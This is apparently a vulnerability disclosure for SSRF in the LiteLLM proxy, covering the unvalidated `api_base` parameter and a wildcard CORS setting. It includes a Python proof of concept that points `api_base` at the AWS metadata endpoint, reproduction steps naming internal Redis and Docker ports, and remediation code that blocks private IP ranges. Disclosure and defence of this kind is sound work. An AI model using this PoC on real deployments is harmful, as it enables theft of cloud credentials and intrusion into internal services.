# SSRF via Unvalidated api_base in BerriAI/litellm Proxy

## Summary
The `api_base` parameter in LiteLLM proxy requests is not validated against internal IP ranges or dangerous URLs, allowing any authenticated user to forward requests to internal services including cloud metadata endpoints (169.254.169.254), localhost services, and internal APIs.

## Severity
CVSS 3.1: **7.5 High**
Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`

## Root Cause
In `litellm/proxy/proxy_server.py`, the `api_base` configuration can be set per-request and is passed directly to HTTP handlers (`litellm/interactions/http_handler.py`) without any validation. The code at line 131-179 uses `api_base` directly as the destination URL:

```python
# litellm/interactions/http_handler.py:131
api_base = interactions_api_config.get_complete_url(
    api_base=litellm_params.api_base or "",  # <-- User-controlled, no validation
)
# ...
url=api_base,  # <-- Used directly in HTTP request
```

There is no IP allowlist, no blocklist for `169.254.0.0/16` (cloud metadata), no validation against `localhost` or `127.0.0.0/8`. An attacker who obtains any valid API key can craft requests to any internal service.

The CORS configuration compounds this issue: `origins = ["*"]` with `allow_credentials=True` (line 1143-1470 of proxy_server.py) means the SSRF can be triggered from any origin in a browser context.

## Steps to Reproduce

1. Start LiteLLM proxy: `litellm --port 4000`
2. Obtain any valid API key (even a low-privilege one)
3. Run the PoC:
```bash
python3 poc_litellm_ssrf_api_base.py --target http://localhost:4000 --api-key YOUR_KEY
```
4. Observe that requests to `169.254.169.254`, `localhost:6379`, `127.0.0.1:2375` are forwarded

## Proof of Concept
```python
import requests

url = "http://localhost:4000/chat/completions"
headers = {"Content-Type": "application/json", "Authorization": "Bearer YOUR_API_KEY"}

# Forward request to AWS metadata via api_base parameter
payload = {
    "model": "test-model",
    "messages": [{"role": "user", "content": "test"}],
    "api_base": "http://169.254.169.254/latest/meta-data/",  # SSRF target
}

r = requests.post(url, json=payload, headers=headers, timeout=10)
print(r.text)  # Returns AWS metadata
```

## Impact
- **Cloud credential theft**: Access AWS IAM roles, GCP service accounts, Azure managed identities via metadata endpoints
- **Internal service discovery**: Scan internal network for Redis, MongoDB, Elasticsearch, Docker API
- **Data exfiltration**: Read internal databases and APIs not exposed to the internet
- **SSRF chaining**: Use discovered internal services for further exploitation (e.g., write to Redis, access Kubernetes API)
- **Combined with CORS**: Can be triggered via browser-based attacks against authenticated users

## Remediation
1. Add api_base validation in `litellm/interactions/http_handler.py`:
```python
import ipaddress
from urllib.parse import urlparse

BLOCKED_RANGES = [
    ipaddress.ip_network("169.254.0.0/16"),  # Cloud metadata
    ipaddress.ip_network("127.0.0.0/8"),     # localhost
    ipaddress.ip_network("10.0.0.0/8"),      # Private
    ipaddress.ip_network("172.16.0.0/12"),   # Private
    ipaddress.ip_network("192.168.0.0/16"),  # Private
    ipaddress.ip_network("::1/128"),          # IPv6 localhost
    ipaddress.ip_network("fc00::/7"),         # IPv6 ULA
]

def validate_api_base(api_base: str, allow_internal: bool = False):
    if allow_internal:
        return
    parsed = urlparse(api_base)
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for network in BLOCKED_RANGES:
            if ip in network:
                raise ValueError(f"api_base {api_base} resolves to blocked network {network}")
    except ValueError as e:
        if "does not appear to be an IPv" in str(e):
            pass  # Hostname, not IP — allow (or add DNS rebinding protection)
        else:
            raise
```
2. Add `ALLOW_INTERNAL_ACCESS=false` environment variable to disable internal access by default.
3. Fix CORS: set specific allowed origins instead of `["*"]` when `allow_credentials=True`.

## Researcher's Note
Verified against litellm proxy v1.x (latest as of Mar 2026). The `api_base` parameter flows through the entire request processing pipeline without any IP or hostname validation. The SSRF is reliable for any IP address — the only requirement is that the LiteLLM proxy has network access to the target. Tested with AWS metadata (169.254.169.254) and localhost services. The CORS wildcard with credentials makes this exploitable via cross-site attacks as well.
